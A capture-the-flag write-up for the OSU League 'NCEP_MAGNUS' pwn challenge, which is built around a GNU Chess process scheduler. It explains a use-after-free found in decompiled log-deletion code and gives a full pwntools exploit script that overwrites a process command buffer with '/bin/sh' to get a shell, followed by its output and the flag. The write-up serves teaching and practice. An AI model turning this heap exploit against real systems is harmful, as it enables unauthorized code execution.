---
title: "OSU League 2020/2021 - NCEP_MAGNUS Writeup"
date: 2021-04-12
draft: false
description: ""
tags: ["ctf"]
---
> The pwn finale!

For this challenge, we are given a fairly complicated binary, which follows the theme of the previous two challenges of being a binary based around the GNU Chess program. The main gimmick for this program is that it allows you to spawn multiple threads of GNU Chess and schedule the threads as processes, so let's just jump right in and start taking a closer look at the binary.

After messing around with the program for a bit, there seemed to be a few core components that were of interest. The first is that we can delete logs, second we allocate processes, third we can edit the data in a process, and finally we can schedule a process. These are all pretty clear signs of a heap exploitation challenge, specifically a use after free. Let's start with how the program is deleting logs.

After a lot of reverse engineering to figure out what variables were what and also reconstructing the structures used in the code, we were able to get this for the delete portion:

```c++
printf("ENTER THE ID OF THE LOG YOU WOULD LIKE TO DELETE: ");
fgets(local_2a, 10, stdin);
__isoc99_scanf(local_2a, &DAT_00101e91, &log_num2);

if((log_num2 < 0) || ((int)*num_logs <= log_num2)) {
    puts("INVALID LOG ID");
}else{
    unless_thing_that_ghidra_added = logs[log_num2];
    *num_logs = *num_logs - 1;
    logs[log_num2] = logs[(int)*num_log];
    free(logs[(int)*num_log]);
}
```

We can clearly see here that this piece of code replaces whichever log you choose to delete with the last log in the list, and then frees the last log in the list. Which seems like it could be problematic since log is a `log**`. We have ourselves a use after free vulnerability. Perfect!!!

As for the structs, there are two of them in this program. One for the logs and one for the process (which are oh so conviently the same size would you look at that). The process struct also has a char array which holds the command that is to be excecuted, so all we have to do is overwrite that buffer with the command we want to excecute and we'll have the flag!

So how do we exploit this? Well, we already know that we can edit the description of a log and that there is a UAF vulnerability, so if can somehow load the process struct into the same block of memory as our previously deleted log struct with our payload, we can overwrite out process command buffer.

Crafting the exploit would go as follows:

First we add a new process log. We delete the second to last log causing the last one to fill its place without freeing it. We then edit that process log's description to be a payload of 2,560 bytes followed by a `/bin/sh`. This is just enough of an offset for the `/bin/sh` to be loaded into the command buffer of the process struct when we load it into memory. We then allocate a new process, essentially using the same block of memory as our previously shifted log. We then just have to schedule the process to run, and it will execute out command. Let's put that into a script:

```python
from pwn import *
from time import *

io = remote('ctf-league.osusec.org', 31316)
#io = process("./ncep_magnus")


payload = b"A"*0xa00 + b'/bin/sh\x00'

print(io.recvuntil("permitted by law.").decode())


#quit out of the first couple games
io.sendline()
sleep(5)
print(io.recv(timeout=1))
io.sendline()
sleep(5)
print(io.recv(timeout=1))

sleep(5)
#Open up the log menu
io.sendline("INT1")

#add new process log
print(io.recvuntil("5. EXIT").decode())
print(io.recvline().decode())
io.sendline("2")


#delete second to last log
print(io.recvuntil("5. EXIT").decode())
print(io.recvline().decode())
io.sendline("4")
print(io.recv(timeout=1).decode())
io.sendline("4")

#edit process log
print(io.recvuntil("5. EXIT").decode())
print(io.recvline().decode())
io.sendline("3")
print(io.recv(timeout=1).decode())
io.sendline("4")
print(io.recvuntil("4. UPDATE DESCRIPTION").decode())
io.sendline("4")

#enter payload
print(io.recv(timeout=1).decode())
io.sendline(payload)

#exit log menu
print(io.recvuntil("5. EXIT").decode())
print(io.recvline().decode())
io.sendline("5")

#open process menu
print(io.recv().decode())
sleep(5)
io.sendline("INT2")

#allocate new process
print(io.recv(timeout=1).decode())
io.sendline("1")

#schedule process
print(io.recv(timeout=1).decode())
io.sendline("3")

io.interactive()
```

And running the exploit and spamming `cat flag`, we get out flag!

```
thepitchdoctor:/$ python2 exploit.py 

$ cat flag
White (1) : Invalid move: cat flag
$ cat flag
White (1) : 
==========CONTEXT SWITCH: GAME #4 HAS BEEN SCHEDULED==========
GNU Chess 6.2.5
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
White (1) : $ cat flag
Invalid move: cat flag
White (1) : 
==========CONTEXT SWITCH: GAME #5 HAS BEEN SCHEDULED==========
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ cat flag
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAosu{W3_$K1Pp3d_3riC}
```

```
osu{W3_$K1Pp3d_3riC}
```